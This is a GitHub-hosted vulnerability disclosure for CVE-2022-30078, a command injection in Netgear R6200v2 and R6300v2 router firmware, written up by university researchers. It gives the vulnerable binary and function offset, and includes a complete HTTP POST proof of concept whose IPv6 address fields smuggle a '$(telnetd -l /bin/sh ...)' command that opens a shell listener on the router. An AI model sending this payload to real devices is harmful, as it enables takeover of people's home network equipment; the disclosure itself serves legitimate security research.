
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F10TG%2Fvulnerabilities%2Fblob%2Fmain%2FNetgear%2FCVE-2022-30078%2FCVE-2022-30078.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F10TG%2Fvulnerabilities%2Fblob%2Fmain%2FNetgear%2FCVE-2022-30078%2FCVE-2022-30078.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=10TG%2Fvulnerabilities)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[10TG](/10TG)
/
**[vulnerabilities](/10TG/vulnerabilities)**
Public

* [Notifications](/login?return_to=%2F10TG%2Fvulnerabilities) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2F10TG%2Fvulnerabilities)
* [Star
   8](/login?return_to=%2F10TG%2Fvulnerabilities)

* [Code](/10TG/vulnerabilities)
* [Issues
  0](/10TG/vulnerabilities/issues)
* [Pull requests
  0](/10TG/vulnerabilities/pulls)
* [Actions](/10TG/vulnerabilities/actions)
* [Projects
  0](/10TG/vulnerabilities/projects)
* [Security](/10TG/vulnerabilities/security)
* [Insights](/10TG/vulnerabilities/pulse)

Additional navigation options

* [Code](/10TG/vulnerabilities)
* [Issues](/10TG/vulnerabilities/issues)
* [Pull requests](/10TG/vulnerabilities/pulls)
* [Actions](/10TG/vulnerabilities/actions)
* [Projects](/10TG/vulnerabilities/projects)
* [Security](/10TG/vulnerabilities/security)
* [Insights](/10TG/vulnerabilities/pulse)

## Files

 main
## Breadcrumbs

1. [vulnerabilities](/10TG/vulnerabilities/tree/main)
2. /[Netgear](/10TG/vulnerabilities/tree/main/Netgear)
3. /[CVE-2022-30078](/10TG/vulnerabilities/tree/main/Netgear/CVE-2022-30078)
/
# CVE-2022-30078.md

 Blame  Blame
## Latest commit

## History

[History](/10TG/vulnerabilities/commits/main/Netgear/CVE-2022-30078/CVE-2022-30078.md)45 lines (43 loc) · 4.48 KB main
## Breadcrumbs

1. [vulnerabilities](/10TG/vulnerabilities/tree/main)
2. /[Netgear](/10TG/vulnerabilities/tree/main/Netgear)
3. /[CVE-2022-30078](/10TG/vulnerabilities/tree/main/Netgear/CVE-2022-30078)
/
# CVE-2022-30078.md

Top
## File metadata and controls

* Preview
* Code
* Blame

45 lines (43 loc) · 4.48 KB[Raw](https://github.com/10TG/vulnerabilities/raw/refs/heads/main/Netgear/CVE-2022-30078/CVE-2022-30078.md)
# Command injection vulnerability in Netgear R6200\_v2 and R6300v2 routers

## Basic information

* CVE-ID：CVE-2022-30078
* Vendor: Netgear
* Product: R6200\_v2 and R6300\_v2
* Firmware version: All firmware version including the latest R6200v2-V1.0.3.12\_10.1.11 and R6300v2-V1.0.4.52\_10.0.93
* Firmware download link: <https://www.downloads.netgear.com/files/GDC/R6200V2/R6200v2-V1.0.3.12_10.1.11.zip>

  <https://www.downloads.netgear.com/files/GDC/R6300V2/R6300v2-V1.0.4.52_10.0.93.zip>
* Type: Insecure permissions - code execution

## Vulnerability description

Vulnerability exists in the binary `/sbin/acos_service` in all R6200\_v2 and R6300\_v2 firmware versions including the latest R6200v2-V1.0.3.12 and R6300v2-V1.0.4.52. It might also infect some other products, which is recently not analyzed.

Taking the latest R6200\_V2\_1.0.3.12 firmware as an example, the four variables `ipv6_wan_ipaddr`, `ipv6_lan_ipaddr`, `ipv6_wan_length`, and `ipv6_lan_length` are passed into a function at offset 0x1B070.

[![vulnerable function call](/10TG/vulnerabilities/raw/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/caller_code.png)](/10TG/vulnerabilities/blob/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/caller_code.png)

Later, by analyzing the if statement, we can further confirm that these four variables can lead to command injection vulnerabilities. These parameters are passed into a `sprintf` function by the format string `%s`. Then, the value is passed to a `system`, which leads to a command injection vulnerability.

[![the vulnerable place](/10TG/vulnerabilities/raw/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/vuln_code.png)](/10TG/vulnerabilities/blob/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/vuln_code.png)

Through further attemps, we found that remote authenticated attackers can modify the value of the vulnerable parameters in website <http://192.168.1.1/IPV6_fixed.htm> by sending a modified request. As the vulnerable parameters are directly saved in nvram after sending the request, attackers can then execute arbitrary remote command as they controlled the parameter of a `system` call.

After visiting the web page and sending a `POST` request, if we set the `ipv6_wan_ipaddr` parameter of the request to be `%24%28telnetd+-l+%2Fbin%2Fsh+-p+1235+-b+0.0.0.0%29`, we can actually execute command which `$(telnetd -l /bin/sh -p 1235-b 0.0.0.0)`.

A potential PoC is shown below:

```
POST /ipv6_fix.cgi?id=2068267834 HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1087
Origin: http://192.168.1.1
Authorization: Basic YWRtaW46YWRtaW4x
Connection: close
Referer: http://192.168.1.1/IPV6_fixed.htm
Cookie: XSRF_TOKEN=1222440606
Upgrade-Insecure-Requests: 1
apply=Apply&login_type=Fixed&IPv6WanAddr1=2001&IPv6WanAddr2=3CA2&IPv6WanAddr3=010F&IPv6WanAddr4=00A1&IPv6WanAddr5=121C&IPv6WanAddr6=0000&IPv6WanAddr7=0000&IPv6WanAddr8=0010&ProfixWanLength=6&IPv6Gateway1=2001&IPv6Gateway2=3CA2&IPv6Gateway3=010F&IPv6Gateway4=00A1&IPv6Gateway5=121C&IPv6Gateway6=0000&IPv6Gateway7=0000&IPv6Gateway8=0002&DAddr1=&DAddr2=&DAddr3=&DAddr4=&DAddr5=&DAddr6=&DAddr7=&DAddr8=&PDAddr1=&PDAddr2=&PDAddr3=&PDAddr4=&PDAddr5=&PDAddr6=&PDAddr7=&PDAddr8=&IpAssign=auto&IPv6LanAddr1=3113&IPv6LanAddr2=3CA2&IPv6LanAddr3=010F&IPv6LanAddr4=001A&IPv6LanAddr5=121B&IPv6LanAddr6=0000&IPv6LanAddr7=0000&IPv6LanAddr8=0001&ProfixLanLength=6&ipv6_wan_ipaddr=%24%28telnetd+-l+%2Fbin%2Fsh+-p+1235+-b+0.0.0.0%29&ipv6_lan_ipaddr=3113%3A3CA2%3A010F%3A001A%3A121B%3A0000%3A0000%3A0001&ipv6_wan_length=6&ipv6_lan_length=6&ipv6_pri_dns=%3A%3A%3A%3A%3A%3A%3A&ipv6_sec_dns=%3A%3A%3A%3A%3A%3A%3A&ipv6_wan_gateway=%24%28telnetd+-l+%2Fbin%2Fsh+-p+1234+-b+0.0.0.0%29&ipv6_enable_dhcp=&ipv6_proto=fixed

```

An evidence of the vulnerable is shown below:

[![reproduction evidence-ipv6_wan_ipaddr](/10TG/vulnerabilities/raw/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_wan_ipaddr.png)](/10TG/vulnerabilities/blob/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_wan_ipaddr.png)

Similarly, we can also change the other three parameters to construct similar commands, the evidence of the attacks using these parameters are shown as below:
[![reproduction evidence-ipv6_lan_ipaddr](/10TG/vulnerabilities/raw/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_lan_ipaddr.png)](/10TG/vulnerabilities/blob/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_lan_ipaddr.png)

[![reproduction evidence-ipv6_wan_length](/10TG/vulnerabilities/raw/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_wan_length.png)](/10TG/vulnerabilities/blob/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_wan_length.png)

[![reproduction evidence-ipv6_wan_length](/10TG/vulnerabilities/raw/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_lan_length.png)](/10TG/vulnerabilities/blob/main/Netgear/CVE-2022-30078/CVE-2022-30078.assets/reproduction_ipv6_lan_length.png)

## Acknowledgment

This vulnerability credits to [@maybethetricker](https://github.com/maybethetricker)(Runyuan Mei) and [@river-li](https://github.com/river-li)(Zichuan Li) from Wuhan University.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

